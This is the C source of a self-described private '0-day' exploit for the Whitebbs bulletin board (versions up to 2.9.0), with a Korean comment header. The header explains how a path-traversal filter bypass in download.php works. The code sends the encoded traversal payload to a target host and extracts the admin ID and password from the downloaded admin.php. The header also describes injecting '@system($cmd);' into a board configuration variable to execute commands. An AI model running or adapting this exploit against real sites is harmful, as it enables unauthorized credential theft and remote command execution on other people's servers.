/*
* Whitebbs 0-day exploit <= 2.9.0 - download.php
*
* THIS IS NOT A PUBLIC EXPLOIT! DO NOT DISTRIBUTE!!
*           
*       <? $eMail = "indra"."\x40"."linux.co.kr"; ?>
* 
* 비공개 익스플로잇 입니다.
* 절대 외부에 공개하지 마십시요.
*
* - Attack Summary
* 
*   본 익스플로잇은 whitebbs 의 download.php 파일을 공격합니다.
* download.php 는 웹 상의 유저에게 파일을 전송해주는 과정에서
* 임의의 파일을 다운받지 못하도록 일종의 필터링을 구현하였는데,
* 그 implementation 에서는 약간의 취약점이 존재하였습니다.
*
* -- [ download.php ]
*  33         $file = eregi_replace("(^\/|\.\.|`|'|;|#|~|@|\?|=|&|!|php)", "", $file) ;
* -- [ download.php ]
*
*   윗 부분에서는 파일이름에 대한 정규식 검사를 실행하여, 특수문자와 php라는 
* 문자열의 사용을 제한하는것 처럼 보이지만, 
* eregi_replace() 의 정규식 루틴을 자세히 보면, 
* '/' 문자앞에 '^' 가 있는것을 볼 수 있습니다.
* 정규표현식에서 '^' 는 처음 부분을 의미합니다.
* 그러므로 '/' 에 대한 제한은 처음 문자에서만 '/' 문자를 사용하지 않으면
* 피해갈 수 있습니다.
* 
*   그 후에, 상위 디렉토리를 의미하는 ".." 문자를 제한하였는데,
* 이것은 다음의 방법으로 제한을 피해갑니다.
* ".." 은 2바이트를 차지하고, 나머지 다른것들은 1바이트를 차지합니다.
* 그리고 필터링에 사용된 eregi_replace() 에서는 
* 무조건 해당 문자를 삭제하게 됩니다.
* 이것을 이용해 ". (삭제 문자) ." 라는 형식으로 하게 되면 
* 필터링을 통과할 수 있게 됩니다.
* 
*   "php" 라는 문자열도 같은 방법으로 필터링을 피해갈 수 있습니다.
* 그래서 본 익스플로잇에서는 파일이름을 다음과 같이 만들게 됩니다.
*
* file=.~./.~./member/admin.p~h~p
*
* - Attack Scenario
* 
*   본래 본 익스플로잇에서는 또 다른 취약점을 사용해 nobody 권한의 
* 쉘 권한 획득을 하는것 까지 구현하려 했으나, 
* 해당 취약점은 magic_quotes_gpc 라는 php 설정에 의존한 작용을 하므로,
* 익스플로잇에는 반영하지 않고 공개합니다.
* 
*   Admin ID/Password 를 획득하였다면, admin login 후 게시판 설정을
* 요리할 수 있게 됩니다.
* 
* $WHITEBBS_INSTALL_DIR/admin/board/config_open.php?conf_name=__global.conf.php
*
* 위 경로는 __global.conf.php 라는 설정파일에 Admin 이 설정한 내용을
* 저장할 수 있는 URL 입니다.
* 그런데, 다음과 같은 상황을 만들수 있습니다.
*
* [ 설정 전 ]
*
* indra$ grep C_board_title board/conf/__global.conf.php
* $C_board_title = "전역설정 제목" ;
* indra$
*
* [ 설정 후 ]
*
* indra$ grep C_board_title board/conf/__global.conf.php
* $C_board_title = "전역설정 제목"; @system($cmd); echo "" ;
* indra$
* 
* 즉, $C_board_title 변수에 "" 를 적용하여, nobody 명령을 실행시킬 수 있는
* 공격을 할 수 있습니다.
* 물론 php.ini 의 magic_quotes_gpc 설정이 Off 되어 있다면 말입니다.
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>

#define PORT        80
#define ID_VAR      "$C_admin_id"
#define PASS_VAR    "$C_admin_password"

void    *hparse(char *, int);
void    request(int, char *, char *);
void    usage(char *);
char    *getinfo(void *, char *);

char *id = NULL;
char *pass = NULL;

int main(int argc, char **argv)
{
    int             opt,
                    sock,
                    port = 80;
    char            *url = NULL,
                    *hname = NULL,
                    *path = NULL,
                    *strptr = NULL;
    char            buf[2048];
    struct hostent  *he;
    struct sockaddr_in  sin;
    
    
    fprintf(stdout,
            "[!] Whitebbs 0-day exploit <= 2.9.0 - download.php\n\n"
            "THIS IS NOT A PUBLIC EXPLOIT! DO NOT DISTRIBUTE!!\n"
            "\t\t\tindra <indra@linux.co.kr>\n\n"
    );
    
    while((opt = getopt(argc, argv, "u:p:")) != -1) {
        switch(opt) {
            case 'u':
                url = optarg;
                break;
            case 'p':
                port = atoi(optarg);
                break;
            default:
                usage(argv[0]);
                break;
        }
    }

    if(url == NULL) usage(argv[0]);

    if((hname = hparse(url, 0x2f)) == NULL) usage(argv[0]);
    path = url + strlen(hname);
    
    if((he = gethostbyname(hname)) == NULL) {
        fprintf(stderr, "%s:\n", hname);
        fprintf(stderr, "! gethostbyname() function error.\n");
        exit(-1);
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    memcpy(&sin.sin_addr, he->h_addr, he->h_length);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    fprintf(stdout, 
            "* Target: %s (%s)\n"
            "* URL: http://%s/board/download.php\n"
            "* Port: %d\n"
            , hname, (char*)inet_ntoa(sin.sin_addr), url, port);
    
    if(connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0) {
        fprintf(stderr, "! Connection refused.\n");
        exit(-1);
    }

    fprintf(stdout, "* Connected.\n* Send Request.\n");
    
    request(sock, hname, path);

    fprintf(stdout, "* Download admin.php.\n");
    fprintf(stdout, "* Getting Admin ID/Password.\n\n");
    
    for(;;) {
        memset(buf, 0, sizeof(buf));
        if(recv(sock, buf, sizeof(buf) - 1, 0) == 0) break;
        if((strptr = strstr(buf, "<?")) != NULL) {
            if(((id = getinfo(strptr, ID_VAR)) == NULL) || 
            ((pass = getinfo(strptr, PASS_VAR)) == NULL)) {
                fprintf(stderr, "! Could not Admin information.\n");
                exit(-1);
            }
        }
    }

    if(id == NULL || pass == NULL) {
        fprintf(stderr, "! Failed.\n");
    }
    else {
        fprintf(stdout, "[!] Admin ID: %s\n", id);
        fprintf(stdout, "[!] Admin Password: %s\n\n", pass);
        fprintf(stdout, "* Complete.\n");
    }

    close(sock);

    free(id);
    free(pass);
    free(hname);
    return 0;
}

void *hparse(char *url, int ch)
{
    int     len = 0;
    char    *ptr = NULL,
            *ret = NULL;

    ptr = strchr(url, ch);
    
    if(ptr == NULL) return NULL;
    
    len = (ptr - url) + 1;
    
    if(!(ret = malloc(len))) {
        fprintf(stderr, "! Out of memory\n");
        exit(-1);
    }

    snprintf(ret, len, "%s", url);

    return (void*)ret;
}

void request(int sock, char *host, char *path)
{
    int     len = 0;
    char    *reqbuf = NULL;
    
    len = strlen(host) + strlen(path) + 200;
    
    if(!(reqbuf = malloc(len))) {
        fprintf(stderr, "! Out of memory.\n");
        exit(-1);
    }
    
    sprintf(reqbuf,
            "POST %s/board/download.php HTTP/1.1\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 83\r\n"
            "Host: %s\r\n\r\n"
            "file=%%2e%%7e%%2e%%2f%%2e%%7e%%2e%%2f%%6d%%65%%6d%%62%%65%%72"
            "%%2f%%61%%64%%6d%%69%%6e%%2e%%70%%7e%%68%%7e%%70\r\n"
    , path, host);

    send(sock, reqbuf, len - 1, 0);
    free(reqbuf);
}

void usage(char *fname)
{
    fprintf(stderr,
            "Usage: %s -u <URL> [ -p <port> ]\n"
            "ex) %s www.indra.co.kr/whitebbs -p 80\n", fname, fname);
    exit(-1);
}

char *getinfo(void *info, char *str)
{
    int     len = 0;
    char    *prev = NULL,
            *next = NULL,
            *buf = NULL;

    if((prev = strstr(info, str)) != NULL) {
        prev = strchr(prev, '"'), prev++;
        next = strchr(prev, '"');

        len = (next - prev) + 1;

        if(!(buf = malloc(len + 1))) {
            fprintf(stderr, "! Out of memory.\n");
            return NULL;
        }
        
        snprintf(buf, len, "%s", prev);
    }
    return (char*)buf;
}
